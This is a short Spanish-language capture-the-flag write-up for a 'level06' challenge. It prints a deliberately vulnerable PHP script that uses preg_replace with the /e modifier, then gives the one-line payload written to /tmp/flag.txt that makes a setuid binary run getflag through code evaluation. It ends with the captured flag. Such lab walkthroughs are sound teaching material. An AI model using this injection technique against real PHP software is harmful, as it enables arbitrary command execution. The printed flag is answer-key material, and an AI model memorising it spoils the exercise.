@@ -1,0 +1,26 @@
+level06
+
+	tenemos dos archivos, un ejecutable y un php con vulnerabilidades:
+
+	el ejecutable es un setuid y el php muestra un remplazamiento de strings(despues de mucha investigación)
+
+	el .php nos deja ver el codigo pero en esencia es lo mismo, solo que uno esta compilado asi que usaremos el
+	ejecutable para vulnerar y conseguir la flag, el codigo del .php es:
+
+	#!/usr/bin/php
+	<?php
+	function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+	function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+	$a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+	$r = x($argv[1], $argv[2]); print $r;
+	?>
+
+	en este caso crearemos un archivo llamado flag.txt donde guardaremos la flag y abusaremos de preg_replace para confundir
+	el ejecutable y que nos salga y("${`getflag`}") para que ejecute el getflag como siempre, todo desde tmp:
+
+	echo -e "[x \${\`getflag\`}]" > /tmp/flag.txt
+
+	Bingo, tenemos la flag:
+
+	wiok45aaoguiboiki2tuin6ub
+
